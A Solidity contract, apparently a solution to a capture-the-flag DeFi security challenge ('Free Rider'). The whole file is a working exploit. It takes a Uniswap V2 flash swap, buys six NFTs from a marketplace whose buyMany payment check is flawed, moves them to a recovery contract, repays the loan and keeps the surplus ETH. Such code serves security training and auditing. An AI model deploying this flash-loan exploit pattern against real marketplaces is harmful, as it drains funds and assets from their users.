// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import '@uniswap/v2-core/contracts/interfaces/IUniswapV2Callee.sol';
import '@uniswap/v2-periphery/contracts/interfaces/IWETH.sol';
import "@openzeppelin/contracts/token/ERC721/IERC721.sol";
import "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";

interface IFreeToken {

    function approve(address recipient, uint256 amount) external;
    function permit(
        address owner,
        address spender,
        uint256 value,
        uint256 deadline,
        uint8 v,
        bytes32 r,
        bytes32 s
    ) external;
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) external returns (bool);
    function transfer(address to, uint256 amount) external returns (bool);
    function DOMAIN_SEPARATOR() external view returns (bytes32);
    function nonces(address target) external view returns (uint256);
    function balanceOf(address) external returns (uint256);
}

interface IFreeRouter {

    function getAmountsOut(uint256 amount, address[] calldata path) external view returns (uint256[] memory);
    function getAmountsIn(uint amountOut, address[] memory path) external view returns (uint256[] memory);
    function swapTokensForExactTokens(uint256 amountOut, uint256 amountInMax, address[] calldata path, address recipient, uint256 deadline) external;
    function swapExactTokensForTokens(uint256 amountIn, uint256 amountOutMin, address[] calldata path, address to, uint256 deadline) external returns (uint[] memory amounts);
    function swapExactETHForTokens(uint256 amount, address[] calldata path, address recipient, uint256 deadline) external payable;
    function swapExactTokensForETH(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline) external returns (uint[] memory amounts);
}

interface IFreePair {
    function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external;
}

interface IFreeRiderNFTMarketplace {

    function offerMany(uint256[] calldata tokenIds, uint256[] calldata prices) external;
    function buyMany(uint256[] calldata tokenIds) external payable;
    function offersCount() external view returns(uint256);
}

error AddrError(address);
error IntError(uint256);
error IntArrError(uint256[5]);

contract ExploitFreerider is IUniswapV2Callee, IERC721Receiver {
    IFreeRouter router;
    IFreePair pair;
    IFreeToken token;
    IWETH weth;
    IFreeRiderNFTMarketplace market;
    address recovery;
    IERC721 nft;

    uint constant PLAYER_INITIAL_TOKEN_BALANCE = 10000 ether;
    uint constant PLAYER_INITIAL_ETH_BALANCE = 20 ether;

    constructor(
        address _router,
        address _pair,
        address _token,
        address _weth,
        address _market,
        address _recovery,
        address _nft
    ) {
        router = IFreeRouter(_router);
        pair = IFreePair(_pair);
        token = IFreeToken(_token);
        weth = IWETH(_weth);
        market = IFreeRiderNFTMarketplace(_market);
        recovery = _recovery;
        nft = IERC721(_nft);
    }

    function exploit(uint256 deadline) external payable {
        address[] memory path = new address[](2);

        // Token0 is weth and token1 is token
        // Compute how many tokens needed to get ~15 ETH in weth (use 16 just to be safe)
        path[0] = address(token);
        path[1] = address(weth);
        uint256[] memory amountsIn = router.getAmountsIn(16 ether, path);

        bytes memory data = abi.encode(deadline);
        pair.swap(amountsIn[1], 0, address(this), data);

        weth.withdraw(IFreeToken(address(weth)).balanceOf(address(this)));
        payable(msg.sender).transfer(address(this).balance);
    }

    // This gets called by the flash swap
    function uniswapV2Call(
        address,
        uint amount0,
        uint,
        bytes calldata
    ) external override {

        // Use loan to get eth
        weth.withdraw(amount0);

        uint256 lenBuy = 6;
        uint256[] memory tokenIds = new uint256[](lenBuy);
        for (uint i = 0; i < lenBuy; i++) {
            tokenIds[i] = i;
        }

        market.buyMany{value: 15 ether}(tokenIds);

        // To exploit bug in marketplace, the transfer must happen outside of the receiver call
        bytes memory data = abi.encode(address(this));

        for (uint i = 0; i < lenBuy; i++) {
            nft.safeTransferFrom(address(this), address(recovery), tokenIds[i], data);
        }

        weth.deposit{value: address(this).balance}();
        weth.transfer(msg.sender, amount0 + amount0 * 6 / 1000);
    }

    receive() external payable {}

    function onERC721Received(
        address,
        address,
        uint256,
        bytes calldata
    ) external pure override returns (bytes4) {

        return IERC721Receiver.onERC721Received.selector;
    }
}